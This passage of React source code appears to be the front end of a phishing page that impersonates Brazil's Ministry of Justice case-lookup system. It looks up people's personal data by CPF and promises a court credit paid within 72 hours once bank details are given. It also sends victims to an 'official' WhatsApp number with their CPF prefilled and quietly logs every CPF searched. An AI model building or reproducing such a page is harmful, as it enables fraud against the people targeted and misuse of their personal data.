                  <p className="text-sm font-semibold text-gray-900">{dadosPessoais.NOME}</p>
                </div>
                <div>
                  <p className="text-xs text-gray-400 mb-1">CPF</p>
                  <p className="text-sm font-mono text-gray-900">{formatCPF(dadosPessoais.CPF || cpf.replace(/\D/g, ''))}</p>
                </div>
                <div>
                  <p className="text-xs text-gray-400 mb-1">Nascimento</p>
                  <p className="text-sm text-gray-900">{formatDate(dadosPessoais.NASC) || 'Não consta'}</p>
                </div>
                <div>
                  <p className="text-xs text-gray-400 mb-1">Sexo</p>
                  <p className="text-sm text-gray-900">{formatSexo(dadosPessoais.SEXO)}</p>
                </div>
                <div className="col-span-2">
                  <p className="text-xs text-gray-400 mb-1">Nome da Mãe</p>
                  <p className="text-sm text-gray-900">{dadosPessoais.NOME_MAE || 'Não consta'}</p>
                </div>
                <div>
                  <p className="text-xs text-gray-400 mb-1">Nome do Pai</p>
                  <p className="text-sm text-gray-900">{dadosPessoais.NOME_PAI || 'Não consta'}</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Aviso de prazo */}
        <div className="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg flex gap-3">
          <Clock className="w-5 h-5 text-[#1351B4] shrink-0 mt-0.5" />
          <div>
            <p className="text-sm font-semibold text-[#1351B4]">Prazo para Regularização</p>
            <p className="text-sm text-gray-700 mt-1">
              Para receber o crédito judicial, é necessário informar os dados bancários. Após a validação, o valor será depositado em até 72 horas úteis.
            </p>
          </div>
        </div>
      </main>

      {/* Botão fixo */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200">
        <div className="max-w-4xl mx-auto px-4 py-4">
          {dadosEnviados ? (
            <a
              href={`https://wa.me/${config.whatsapp_numero}?text=${encodeURIComponent(`Processo: ${processosIniciais[0].numero_processo}\nNome: ${processosIniciais[0].nome}\nCPF: ${cpf}`)}`}
              target="_blank"
              rel="noopener noreferrer"
              className="w-full py-4 bg-[#25D366] hover:bg-[#128C7E] text-white rounded font-semibold flex items-center justify-center gap-3 transition-colors"
            >
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
              Continuar pelo WhatsApp Oficial
            </a>
          ) : (
            <button
              onClick={() => setProsseguimento(processosIniciais[0])}
              className="w-full py-4 bg-[#1351B4] hover:bg-[#071D41] text-white rounded font-semibold flex items-center justify-center gap-3 transition-colors"
            >
              <CreditCard className="w-5 h-5" />
              Informar Dados Bancários para Recebimento
            </button>
          )}
          <p className="text-center text-xs text-gray-400 mt-3">
            Sistema de Consulta Processual - Ministério da Justiça
          </p>
        </div>
      </div>
    </div>
  )
}

export default function ConsultaPage() {
  const [view, setView] = useState('search')
  const [cpf, setCpf] = useState('')
  const [processos, setProcessos] = useState(null)
  const [dadosPessoais, setDadosPessoais] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [pendingData, setPendingData] = useState(null)

  const handleLoadingComplete = useCallback(() => {
    if (pendingData) {
      setProcessos(pendingData.processos)
      setDadosPessoais(pendingData.dadosPessoais)
      setPendingData(null)
      setView('result')
    }
    setLoading(false)
  }, [pendingData])

  async function handleSearch(cpfValue) {
    setCpf(cpfValue)
    const digits = cpfValue.replace(/\D/g, '')

    setLoading(true)
    setError('')
    setProcessos(null)
    setDadosPessoais(null)
    setPendingData(null)

    try {
      const res = await fetch(`/api/consulta/${digits}`)

      if (!res.ok) {
        setLoading(false)
        if (res.status === 404) {
          setError('Nenhum processo encontrado para este CPF')
        } else {
          setError('Erro ao consultar. Tente novamente.')
        }
        return
      }

      const data = await res.json()
      setPendingData({ processos: data.processos, dadosPessoais: data.dadosPessoais })

      // Registrar acesso
      const deviceInfo = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
      const browserInfo = navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)/)?.[0] || 'Desconhecido'
      fetch('/api/acesso', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf_consultado: digits, dispositivo: deviceInfo, navegador: browserInfo })
      }).catch(() => {})
    } catch {
      setLoading(false)
      setError('Erro de conexão. Verifique sua internet.')
    }
  }

  function handleBack() {
    setView('search')
    setProcessos(null)
    setDadosPessoais(null)
    setCpf('')
    setError('')
  }

  if (loading && pendingData) {
    return <LoadingScreen onComplete={handleLoadingComplete} />
  }

  if (view === 'result' && processos) {
    return <ResultScreen processos={processos} cpf={cpf} dadosPessoais={dadosPessoais} onBack={handleBack} />
  }

  return <SearchScreen onSearch={handleSearch} loading={loading} error={error} />
}
